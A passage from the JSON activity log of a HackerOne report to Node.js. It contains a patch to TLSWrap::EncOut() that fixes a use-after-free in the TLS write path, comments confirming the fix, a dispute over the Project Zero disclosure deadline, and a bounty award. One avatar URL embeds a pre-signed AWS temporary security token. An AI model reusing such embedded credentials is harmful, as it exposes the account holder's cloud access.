TLSWrap::EncOut() {\n+int TLSWrap::EncOut() {\n   Debug(this, \"Trying to write encrypted output\");\n\n   // Ignore cycling data if ClientHello wasn't yet parsed\n   if (!hello_parser_.IsEnded()) {\n     Debug(this, \"Returning from EncOut(), hello_parser_ active\");\n-    return;\n+    return 0;\n   }\n\n   // Write in progress\n   if (write_size_ != 0) {\n     Debug(this, \"Returning from EncOut(), write currently in progress\");\n-    return;\n+    return 0;\n   }\n\n   // Wait for `newSession` callback to be invoked\n   if (is_awaiting_new_session()) {\n     Debug(this, \"Returning from EncOut(), awaiting new session\");\n-    return;\n+    return 0;\n   }\n\n   // Split-off queue\n@@ -309,7 +309,7 @@ void TLSWrap::EncOut() {\n\n   if (ssl_ == nullptr) {\n     Debug(this, \"Returning from EncOut(), ssl_ == nullptr\");\n-    return;\n+    return 0;\n   }\n\n   // No encrypted output ready to write to the underlying stream.\n@@ -335,7 +335,7 @@ void TLSWrap::EncOut() {\n         });\n       }\n     }\n-    return;\n+    return 0;\n   }\n\n   char* data[kSimultaneousBufferCount];\n@@ -354,8 +354,12 @@ void TLSWrap::EncOut() {\n   Debug(this, \"Writing %zu buffers to the underlying stream\", count);\n   StreamWriteResult res = underlying_stream()-\u003eWrite(bufs, count);\n   if (res.err != 0) {\n-    InvokeQueued(res.err);\n-    return;\n+    if(!in_dowrite_) {\n+      InvokeQueued(res.err);\n+    } else {\n+      current_write_.reset();\n+    }\n+    return res.err;\n   }\n\n   if (!res.async) {\n@@ -368,6 +372,8 @@ void TLSWrap::EncOut() {\n       OnStreamAfterWrite(nullptr, 0);\n     });\n   }\n+\n+  return 0;\n }\n\n\n@@ -820,10 +826,10 @@ int TLSWrap::DoWrite(WriteWrap* w,\n   // Write any encrypted/handshake output that may be ready.\n   // Guard against sync call of current_write_-\u003eDone(), its unsupported.\n   in_dowrite_ = true;\n-  EncOut();\n+  int res = EncOut();\n   in_dowrite_ = false;\n\n-  return 0;\n+  return res;\n }\n\n\ndiff --git a/src/tls_wrap.h b/src/tls_wrap.h\nindex 3b9a6c8598..5f32a73741 100644\n--- a/src/tls_wrap.h\n+++ b/src/tls_wrap.h\n@@ -124,7 +124,7 @@ class TLSWrap : public AsyncWrap,\n   //\n   // EncIn() doesn't exist. Encrypted data is pushed from underlying stream into\n   // enc_in_ via the stream listener's OnStreamAlloc()/OnStreamRead() interface.\n-  void EncOut();  // Write encrypted data from enc_out_ to underlying stream.\n+  int EncOut();  // Write encrypted data from enc_out_ to underlying stream.\n   void ClearIn();  // SSL_write() clear data \"in\" to SSL.\n   void ClearOut();  // SSL_read() clear text \"out\" from SSL.\n\n--\n2.17.1\n```","automated_response":false,"created_at":"2020-10-13T00:30:05.291Z","updated_at":"2020-10-13T00:30:05.291Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9503969,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"The patch looks good to me and the UaF doesn't trigger anymore once it is applied. ","automated_response":false,"created_at":"2020-10-13T10:01:41.021Z","updated_at":"2020-10-13T10:01:41.021Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9507486,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Awesome ok... at this point we've Identified two potential ways of fixing this in nodejs/node master branch and for both the pending 15.0.0 release and 14.x branch. I will be getting a pull request open in our private security repo to work that fix through. I have not yet investigated backporting the fix to both 12.x and 10.x, both of which will be affected by this also. Will update here once we've made progress on the PRs","automated_response":false,"created_at":"2020-10-13T15:14:37.414Z","updated_at":"2020-10-13T15:14:37.414Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9508152,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2020-10-13T15:43:49.194Z","updated_at":"2020-10-13T15:43:49.194Z","additional_data":{"old_severity":null,"new_severity":"High (7.5)","old_severity_id":null,"new_severity_id":875287},"actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9967179,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@fwilhelm I see this in the initial report \"This bug is subject to a 90 day disclosure deadline. After 90 days elapse, the bug report will become visible to the public. The scheduled disclosure date is 2020-12-21.\"\n\nThe project has been working to build patches/fixes but at this point I'm starting to get concerned that we are not going to make the date. In addition even if we can get ready before the 21st unless it is within the next week or so doing a security release that close to the Christmas holiday may not be appreciated.\n\nI'd like to discuss if the disclosure date can be moved out.","automated_response":false,"created_at":"2020-11-30T22:07:40.305Z","updated_at":"2020-11-30T22:07:40.305Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9976481,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@mhdawson I can grant a 14 day grace period as described in our disclosure policy (see https://googleprojectzero.blogspot.com/p/vulnerability-disclosure-faq.html). \n\nThis would move the public disclosure date to Monday 2021-01-04, which seems like a good solution.\nWould that work for you? \n","automated_response":false,"created_at":"2020-12-01T16:15:31.294Z","updated_at":"2020-12-01T16:15:31.294Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9976638,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for that @fwilhelm, moving out the date would be greatly appreciated ... we have fixes for most of the current versions but we're running into some difficulty for the oldest LTS branch due to some of the necessary base level changes necessary not existing in that branch and a complete lack of time on my part to make those changes. We're working through the issue on our end and really appreciate the patience.","automated_response":false,"created_at":"2020-12-01T16:30:44.584Z","updated_at":"2020-12-01T16:30:44.584Z","actor":{"username":"jasnell","cleared":false,"url":"/jasnell","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/211/162/109187a55a3f81113d4b61b965ec72cbaa4970e3_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9977193,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@fwilhelm thanks for moving it out 14 days as that would help but I have to ask if that is the farthest it can be moved. That is the day after the holidays which relies on our releasers being available (ie not taking any additional holidays) as well as potentially expecting project volunteers to do work over the holiday period.","automated_response":false,"created_at":"2020-12-01T17:42:49.249Z","updated_at":"2020-12-01T17:42:49.249Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10042166,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Unfortunately there's no mechanism to delay disclosure beyond 104 days, which would mean the latest date for disclosure would be 2021-01-04. To answer your questions directly, Project Zero does have exceptions for disclosure dates falling on weekends and public holidays, though that doesn't apply in this circumstance.\n\nAny other questions, please let me know. ","automated_response":false,"created_at":"2020-12-08T16:17:42.606Z","updated_at":"2020-12-08T16:17:42.606Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10078043,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I find it disappointing that there is no flexibility to do what's in the best interest of the community.\n\nSecurity releases have been planned for Jan 4th.","automated_response":false,"created_at":"2020-12-11T19:20:13.270Z","updated_at":"2020-12-11T19:20:13.270Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10267588,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2021-01-04T19:52:35.901Z","updated_at":"2021-01-04T19:52:35.901Z","actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"fwilhelm","url":"/fwilhelm"},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10267600,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-04T19:53:32.933Z","updated_at":"2021-01-04T19:53:32.933Z","first_to_agree":true,"actor":{"username":"mhdawson","cleared":false,"url":"/mhdawson","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10271524,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-01-05T08:18:06.704Z","updated_at":"2021-01-05T08:18:06.704Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10271525,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-01-05T08:18:06.771Z","updated_at":"2021-01-05T08:18:06.771Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10849980,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@fwilhelm I would like to ask if you are able to accept an award for this report? \n\n","automated_response":false,"created_at":"2021-03-02T09:45:17.817Z","updated_at":"2021-03-02T09:45:17.817Z","actor":{"username":"danbev","cleared":false,"url":"/danbev","profile_picture_urls":{"medium":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/p1loeyp5eg3uertcvieae0lp6nch/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c?response-content-disposition=inline%3B%20filename%3D%22danbev.jpeg%22%3B%20filename%2A%3DUTF-8%27%27danbev.jpeg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQXEQ3VCGF%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154839Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCNbr25hK1JC2i73IX5uE08m1agZwA%2BCyxTPtXmxpZHFAIgA9v21iU9rOtKWjxfMHo7kqQOL4Y8ABbAnucRVLpaC9cqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDOyim%2FBwzSkIWBPCWirXA1TUfPlTIAz6iDfoaiiMP8hivTDD8uDyRJ%2FoAF5UW%2F6cSrWHj2Mtt%2Fx8tKTYSGoQiyhUdi%2BFdxLY35ZRGqE5k10GcpBa5q9ivBUHzTLtIbzvkVLjo0GDs33RjPyv8lT8%2BIT3cR1GpHz5sKugzk1wJHpaXHIGV7TsNZTez5PsxRWLAbodD46%2Bv0aY9dXICvo8Bld1OIiDoUsI3sX2R7SAEjL0B45opfmY7Hh4KKVF9KyCf7etmcGEL0U%2Bjij5TfmuHRxoVJXFKR4WbBKoHXN3cL5AQhAkGBE5bmE6cTsvfhMkCltMfmR1OmQtt1QK7fs2YWSyJhNNnjgzseVzroJk8qcktNvGQQNtmAz%2F0hi%2BbLDdR3r35MBTZtRPxGxwfYKfk%2Blyikhar%2F%2FfPxr6sJoQhbcKSjiziR8cFwFPC97f3qfgH6sVJVvH5AClhLDj9FMqequ01uI1FMQI%2BQ1BJ1t%2Bl3dX7D09OZCMRrk3HvidiN7al4fmx5e0pKMz7tbb23gSzvgiMJbXeHgATiARA8dz6JIoLosFubesB7ZLWq9owsMVaP42CuihB%2Br9J9vu1HkgY4lcWvgRt8bqCjXjWDPBzlNcnc9D32bMJUDfp2BWdJ0BCnpEi4XjrDCyiJGLBjqlAbw%2BQzzkBo5pgpwg2B9K3Kb9khz80zQhxWTR4UFlyZpApeXe135MxtRrVWf1VeEC8qBZynSiicNEE5qSEPmd%2FKNSihzfYJ9PmbUkfZN9yFsrIArapjiCpWMywbnOVNeLSHMFFv8xtfh0sOTI4VetTtHS5BxyHny%2BvnXM6Hjudg5tfOAvbwkv9j%2BTfq0Y0YGFWvyUNrCeX3Y3zQ5t8ked%2FqOvxUSYeg%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b636443e63e36161783462d708cfc3ed2d9210bb01dbae10eec11cd2b737d5d4"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10956223,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@danbev Thanks for the ping. I'm donating all awards/bounties to Médecins Sans Frontières, so I'm happy to accept it if you want to grant an award.","automated_response":false,"created_at":"2021-03-11T09:25:43.406Z","updated_at":"2021-03-11T09:25:43.406Z","actor":{"username":"fwilhelm","cleared":false,"url":"/fwilhelm","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10965789,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2021-03-12T04:43:52.356Z","updated_at":"2021-03-12T04:43:52.356Z","actor":{"url":"/nodejs","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/022/984/e600648ace4a8553247bce967d461a030aa81d49_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Node.js"}},"bounty_amount":"250.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"nodejs","collaborator":{"username":"fwilhelm","url":"/fwilhelm"},"actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}